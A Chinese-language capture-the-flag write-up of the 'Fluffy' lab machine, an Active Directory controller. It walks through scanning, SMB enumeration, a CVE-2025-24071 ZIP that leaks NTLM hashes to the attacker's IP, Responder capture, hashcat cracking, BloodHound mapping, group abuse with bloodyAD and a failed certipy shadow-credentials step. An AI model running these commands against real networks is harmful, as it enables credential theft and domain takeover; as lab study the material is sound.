## Fluffy

#### 靶机有给出‘帐户的凭据启动 Fluffy box：j.fleischman / J0elTHEM4n1990！’

```
[★]$ nmap -sC -sV 10.129.56.0
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-07 01:52 CST
Nmap scan report for 10.129.56.0
Host is up (0.0092s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-07 14:52:55Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-07T14:54:15+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-01-07T14:54:15+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-07T14:54:15+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-01-07T14:54:15+00:00; +7h00m00s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-07T14:53:38
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
#### 加入域名
```
[★]$ echo "10.129.56.0 fluffy.htb dc01.fluffy.htb" | sudo tee -a /etc/hosts
```
#### 使用提供的凭据J0elTHEM4n1990！，让我们枚举SMB服务。
#### crackmapexec（简称 CME）是一个：专门用来“批量测试 Windows 域 / 主机的认证、权限和横向能力”的后渗透枚举工具
#### “我这组账号能在这台 Windows 上干到什么程度？”
```
[★]$ crackmapexec smb 10.129.56.0 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
<SNIP>
SMB         10.129.56.0     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.56.0     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.129.56.0     445    DC01             [*] Enumerated shares
SMB         10.129.56.0     445    DC01             Share           Permissions     Remark
SMB         10.129.56.0     445    DC01             -----           -----------     ------
SMB         10.129.56.0     445    DC01             ADMIN$                          Remote Admin
SMB         10.129.56.0     445    DC01             C$                              Default share
SMB         10.129.56.0     445    DC01             IPC$            READ            Remote IPC
SMB         10.129.56.0     445    DC01             IT              READ,WRITE  
SMB         10.129.56.0     445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.56.0     445    DC01             SYSVOL          READ            Logon server share
```
#### 查找到一个名为IT的SMB共享，该共享对相关用户具有READ和WRITE权限。让我们连接到分享并进一步列举。
```
[★]$ smbclient '//10.129.56.0/IT' -U 'j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan  7 09:01:21 2026
  ..                                  D        0  Wed Jan  7 09:01:21 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 10:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 10:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 10:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 10:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 09:31:07 2025

		5842943 blocks of size 4096. 1499823 blocks available
smb: \> 
```
#### 在连接到共享后，我们看到一个名为升级通知。PDF的PDF文件。让我们下载它以进一步了解调查。
```
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (410.8 KiloBytes/sec) (average 410.8 KiloBytes/sec)
```
#### 在通知的下面，有一个表，其中包含一些最近发现的漏洞。其中之一CVE-2025-24071是一个Windows文件资源管理器欺骗漏洞，允许攻击者检索提取ZIP文件时的用户的NTLM散列。Library-ms文件，如下所述。
![图片](image/2026010701.png)
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24071
#### Microsoft Windows 文件资源管理器欺骗漏洞 CVE-2025-24071
https://nsfocusglobal.com/windows-file-explorer-spoofing-vulnerability-cve-2025-24071/
#### 由于我们有一个可写的SMB共享，让我们尝试利用这个漏洞。首先，应该使用POC创建带有有效负载的恶意ZIP归档
https://github.com/0x6rss/CVE-2025-24071_PoC/tree/main
```
[★]$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git

[★]$ ls
CVE-2025-24071_PoC
[★]$ cd CVE-2025-24071_PoC
[CVE-2025-24071_PoC][★]$ ls
poc.py  README.md
CVE-2025-24071_PoC][★]$ python3 poc.py
Enter your file name: 11
Enter IP (EX: 192.168.1.162): 10.10.14.190  //本地IP，反弹到本地
completed
CVE-2025-24071_PoC][★]$ ls
exploit.zip  poc.py  README.md
```
#### 现在，必须启动响应器工具以侦听任何NTLM身份验证请求。要先侦听，再上传
```
[★]$ sudo responder -I tun0
```
#### 这将创建一个exploit.zip文件，该文件应该上传到可写SMB共享中
```
[★]$ smbclient '//10.129.56.0/IT' -U 'j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (10.3 kb/s) (average 10.3 kb/s)
smb: \> ls
 <SNIP>
  exploit.zip                         A      326  Wed Jan  7 09:25:05 2026
</SNIP>
```
#### 几秒钟后，我们收到来自p.agila用户的NTLM身份验证请求。保存一下散列到一个文件，并将其传递给hashcat。
```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.56.0
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:c5074942ead6d04d:C023BEF393E38FB7BEE324E61261D896...<SNIP>...30000000000000000000
</SNIP>
```
#### NTLMv2 Challenge/Response hash,结构分析：
```
[username :: domain : server_challenge : ntproofstr : 超长blob] //Responder 抓到的 hash，99% 是 5600
```
```
[★]$ vi hash
[★]$ cat hash
p.agila::FLUFFY:c5074942ead6d04d:C023BEF393E38FB7BEE324E61261D896...<SNIP>...30000000000000000000
```
```
[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[★]$ gunzip rockyou.txt.gz
[★]$ hashcat -m 5600 hash rockyou.txt
P.AGILA::FLUFFY:c5074942ead6d04d:c023bef393e38fb7bee324e61261d896:0...<SNIP>...30000000000000000000:prometheusx-303
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:c5074942ead6d04d:c023bef393e38fb7be...000000
</SNIP>
```
#### 解开的hash为prometheusx-303
### Foothold
#### 使用这些凭据，应该使用Bloodhound枚举Active Directory环境。
```
[★]$ bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.129.56.0
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 02S
```
#### 在本地，我们应该启动neo4j服务，然后将数据上传到Bloodhound。
```
[★]$ sudo neo4j console
Directories in use:
home:         /var/lib/neo4j
config:       /etc/neo4j
logs:         /var/log/neo4j
plugins:      /var/lib/neo4j/plugins
import:       /var/lib/neo4j/import
data:         /var/lib/neo4j/data
certificates: /var/lib/neo4j/certificates
licenses:     /var/lib/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2026-01-07 09:07:23.217+0000 INFO  Logging config in use: File '/etc/neo4j/user-logs.xml'
2026-01-07 09:07:23.235+0000 INFO  Starting...
2026-01-07 09:07:23.976+0000 INFO  This instance is ServerId{d8173e88} (d8173e88-c17d-4348-ba6f-76a2369f3935)
2026-01-07 09:07:25.023+0000 INFO  ======== Neo4j 5.26.1 ========
2026-01-07 09:07:26.381+0000 INFO  Anonymous Usage Data is being sent to Neo4j, see https://neo4j.com/docs/usage-data/
2026-01-07 09:07:26.410+0000 INFO  Bolt enabled on localhost:7687.
2026-01-07 09:07:26.964+0000 INFO  HTTP enabled on localhost:7474.
2026-01-07 09:07:26.965+0000 INFO  Remote interface available at http://localhost:7474/
2026-01-07 09:07:26.967+0000 INFO  id: A05F110BB1E774863A7B4E375F211472F72974D0151DA945A4E879108D47C7CA
2026-01-07 09:07:26.967+0000 INFO  name: system
2026-01-07 09:07:26.967+0000 INFO  creationDate: 2024-10-07T10:34:41.232Z
2026-01-07 09:07:26.967+0000 INFO  Started.
```
#### 浏览器打开localhost:7474 
#### 输入帐号 neo4j 密码neo4j
```
[★]$ bloodhound
```
#### 输入帐号 neo4j 密码neo4j
#### 点击右上角Upload Data, 然后导入数据 ‘使用Bloodhound枚举Active Directory环境’产生的7个.json文件
![图片](image/2026010702.png)
#### 数据导入完成之后搜索用户p.agila
![图片](image/2026010703.png)
#### 要查看该用户的对象控件，我们导航到节点信息->出站对象控制->传递对象控制。Node Info -> Outbound Object Control -> Transitive Object Control 
#### 发现[SERVICE ACCOUNTS@FLUFFY.HTB的3个分线可以GenricWrite]
![图片](image/2026010704.png)
#### 点击[SERVICE ACCOUNTS@FLUFFY.HTB]-> Transitive Object Control 
![图片](image/2026010705.png)
```
从这个输出中，有两件事需要注意。
1. p.agila用户是服务帐户管理器组的一部分，该组具有GenericAll ACL在服务帐户组上。
2. 服务帐户组对ca_svc用户具有GenericWrite ACL，该用户属于证书发布者组。
进一步枚举服务帐户（按照上述方法查看传递对象控件Transitive Object Control ）显示，
该组不仅在ca_svc上有GenericWrite，而且在其他两个帐户上也有GenericWrite。
Winrm_SVC和ldap_SVC

还应该注意的是，winrm_svc用户是远程管理用户的一部分，它允许使用WinRM连接到目标。
要利用这一点，必须使用以下攻击路径。
首先，应该使用GenericAll ACL将我们自己添加到服务帐户中组。
为此，让我们使用bloodyAD。
```
```
sudo apt install pipx -y
pipx ensurepath
pipx uninstall bloodyAD
pipx install bloodyAD

[★]$ pipx install --force bloodyAD
Installing to existing venv 'bloodyad'
  installed package bloodyad 2.5.2, installed using Python 3.11.2
  These apps are now globally available
    - bloodyAD
    - bloodyad
done! ✨ 🌟 ✨
```
```
[★]$ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.56.0 add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts

现在的状态是：

✅ p.agila ∈ service accounts

✅ service accounts 对以下账户有 GenericWrite

winrm_svc

ca_svc

GenericWrite ≠ 直接读密码
但 GenericWrite = 可以写 KeyCredentialLink（Shadow Credentials）
```
#### 然后，作为服务帐户组的成员，应该使用GenericWrite ACL进行添加将影子凭证发送给winrm_svc和ca_svc用户，以检索他们的RC4密码哈希值。为此，我们可以使用证书。
```
[★]$ certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3b4b5299-7fdd-da67-b884-7e5a5af89b61'
[*] Adding Key Credential with device ID '3b4b5299-7fdd-da67-b884-7e5a5af89b61' to the Key Credentials for 'ca_svc'
[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```
